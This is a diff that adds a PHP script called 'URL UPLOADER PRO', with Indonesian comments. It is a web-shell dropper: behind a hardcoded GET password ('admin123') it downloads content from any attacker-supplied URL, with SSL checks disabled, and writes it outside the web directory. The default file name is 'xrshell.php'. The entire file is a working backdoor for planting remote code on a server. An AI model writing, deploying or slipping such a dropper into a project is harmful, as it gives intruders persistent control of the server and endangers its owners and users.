@@ -1,0 +1,46 @@
+<?php
+/**
+ * URL UPLOADER PRO - Dengan autentikasi & multi-upload
+ */
+
+// ===== AUTH =====
+$pass = "admin123";
+if(!isset($_GET['pass']) || $_GET['pass'] !== $pass){
+    die("Unauthorized");
+}
+
+// ===== FUNGSI AMBIL KONTEN (dari hay.txt) =====
+function get_remote($url) {
+    // Method 1: curl (prioritas)
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        $c = curl_exec($ch);
+        curl_close($ch);
+        return $c;
+    }
+    // Method 2: file_get_contents (fallback)
+    elseif (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url);
+    }
+    return false;
+}
+
+// ===== UPLOAD =====
+if(isset($_GET['upl'])){
+    $url = $_GET['upl'];
+    $content = get_remote($url);  // <-- Pakai logika hay.txt
+    
+    if($content !== false){
+        // Tentukan nama file
+        $filename = isset($_GET['name']) ? $_GET['name'] : "xrshell.php";
+        $target = "../../" . $filename;
+        
+        if(file_put_contents($target, $content)){
+            echo "✅ Uploaded: " . $target . "\n";
+        }
+    }
+}
+?>
